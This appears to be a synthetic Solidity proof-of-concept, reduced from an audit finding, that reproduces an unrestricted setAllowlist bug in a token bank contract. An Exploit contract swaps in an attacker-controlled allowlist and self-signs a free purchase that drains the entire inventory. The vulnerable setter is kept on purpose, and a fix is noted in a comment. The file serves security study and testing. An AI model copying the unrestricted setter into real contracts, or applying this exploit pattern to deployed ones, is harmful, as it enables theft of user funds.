// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Remora Dynamic Tokens — SignatureValidator::setAllowlist unrestricted
    (Cyfrin 2025-10-22, finding #63776, reporter 0xStalin)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: SignatureValidator.setAllowlist is external with no access
    control. TokenBank inherits it, so any caller can replace the allowlist
    with a malicious contract whose isSigner() returns true for the attacker.
    The attacker then self-signs buyTokenOCP and receives central tokens for
    free (the useStableCoin payment path is skipped).

    Vulnerable setAllowlist line preserved with @> VULN marker.
//////////////////////////////////////////////////////////////////////////*/

interface IAllowlist {
    function isSigner(address signer) external view returns (bool);
}

/// @dev Minimal central-token inventory held by TokenBank.
contract MockCentralToken {
    string public constant name = "Central";
    string public constant symbol = "CTR";
    uint8 public constant decimals = 0;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
        totalSupply += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "bal");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Attacker-controlled allowlist: isSigner returns true for the attacker signer.
contract MaliciousAllowlist {
    address public maliciousSigner;

    constructor(address _maliciousSigner) {
        maliciousSigner = _maliciousSigner;
    }

    function isSigner(address signer) public view returns (bool) {
        return (signer == maliciousSigner);
    }
}

/// @dev Reduced SignatureValidator + TokenBank (buyTokenOCP path only).
contract TokenBank {
    bytes32 public constant BUY_TOKEN_TYPEHASH =
        keccak256("BuyToken(address investor, address token, uint256 amount)");

    address public allowlist;
    MockCentralToken public immutable central;
    /// @dev Fixed token id used in the signed struct (independent of CREATE addresses).
    address public constant TOKEN_PLACEHOLDER = address(0xC2017A1);
    mapping(address => uint256) public purchased;

    error InvalidAddress();
    error InvalidSignature();
    error InsufficientInventory();

    event AllowlistSet(address allowlist);

    constructor(MockCentralToken central_) {
        central = central_;
    }

    /// @notice UNRESTRICTED — any caller may point TokenBank at a malicious allowlist.
    /// @dev Faithful reduction of SignatureValidator.setAllowlist (external, no modifier).
    function setAllowlist(address allowlist_) external {
        // FIX: make this internal (_setAllowlist) and expose an external restricted wrapper
        if (allowlist_ == address(0)) revert InvalidAddress();
        if (allowlist != allowlist_) {
            allowlist = allowlist_; // @> VULN: setAllowlist is unrestricted — attacker swaps in MaliciousAllowlist
            emit AllowlistSet(allowlist_);
        }
    }

    /// @dev Off-chain-payment buy: no stablecoin transfer. Relies on an admin signature
    ///      whose signer must be allowlist.isSigner. `investor` is the signed beneficiary
    ///      (matches the BuyToken typehash); reduced slightly from msg.sender so the
    ///      signed digest uses a fixed address independent of CREATE nonces.
    function buyTokenOCP(
        address signer,
        address investor,
        address tokenAddress,
        uint256 amount,
        bytes memory signature
    ) external {
        if (!verifySignature(signer, investor, tokenAddress, amount, signature)) {
            revert InvalidSignature();
        }
        // useStableCoin == false → no payment; hand out inventory for free
        _buyToken(investor, tokenAddress, amount);
    }

    function verifySignature(
        address signer,
        address investor,
        address token,
        uint256 amount,
        bytes memory signature
    ) internal view returns (bool result) {
        if (allowlist == address(0) || !IAllowlist(allowlist).isSigner(signer)) {
            return false;
        }
        bytes32 structHash = keccak256(abi.encode(BUY_TOKEN_TYPEHASH, investor, token, amount));
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", structHash));
        result = _recover(digest, signature) == signer;
    }

    function _buyToken(address investor, address tokenAddress, uint256 amount) internal {
        require(tokenAddress == TOKEN_PLACEHOLDER, "token");
        if (central.balanceOf(address(this)) < amount) revert InsufficientInventory();
        central.transfer(investor, amount);
        purchased[investor] += amount;
    }

    function _recover(bytes32 ethSigned, bytes memory signature) internal pure returns (address) {
        require(signature.length == 65, "bad sig");
        bytes32 r;
        bytes32 s;
        uint8 v;
        assembly {
            r := mload(add(signature, 32))
            s := mload(add(signature, 64))
            v := byte(0, mload(add(signature, 96)))
        }
        return ecrecover(ethSigned, v, r, s);
    }
}

contract Exploit {
    MockCentralToken public central; // CREATE nonce 1
    TokenBank public bank; // CREATE nonce 2
    MaliciousAllowlist public mal; // CREATE nonce 3

    address public constant INVESTOR = address(0xBEEF);
    address public constant TOKEN_PLACEHOLDER = address(0xC2017A1);
    uint256 public constant TOTAL_TOKENS = 10_000;

    // Precomputed offline: private key 0xA11CE
    // signer = 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7
    // structHash = keccak256(abi.encode(BUY_TOKEN_TYPEHASH, INVESTOR, TOKEN_PLACEHOLDER, TOTAL_TOKENS))
    // eth_sign(structHash) →
    address public constant SIGNER = 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7;
    bytes32 public constant R = 0x73dbf434e2a13ad655f3c3e196f5724f0d62ef05bcc19b47f7839d04cf09b858;
    bytes32 public constant S = 0x403244f7af78aea5ecac1e8736ab713fb77802b768f737d4717af7ae68917f1f;
    uint8 public constant V = 28;

    constructor() {
        central = new MockCentralToken();
        bank = new TokenBank(central);
        central.mint(address(bank), TOTAL_TOKENS);
        mal = new MaliciousAllowlist(SIGNER);
    }

    function run() external {
        // 1) Unrestricted setAllowlist — attacker points bank at MaliciousAllowlist
        bank.setAllowlist(address(mal));

        // 2) Self-signed free purchase of the entire inventory
        bytes memory sig = abi.encodePacked(R, S, V);
        bank.buyTokenOCP(SIGNER, INVESTOR, TOKEN_PLACEHOLDER, TOTAL_TOKENS, sig);

        // HARM: investor received the entire inventory for free (no stablecoin paid)
        require(central.balanceOf(INVESTOR) == TOTAL_TOKENS, "free purchase failed");
        require(central.balanceOf(address(bank)) == 0, "inventory not drained");
        require(bank.purchased(INVESTOR) == TOTAL_TOKENS, "purchased not tracked");
    }
}
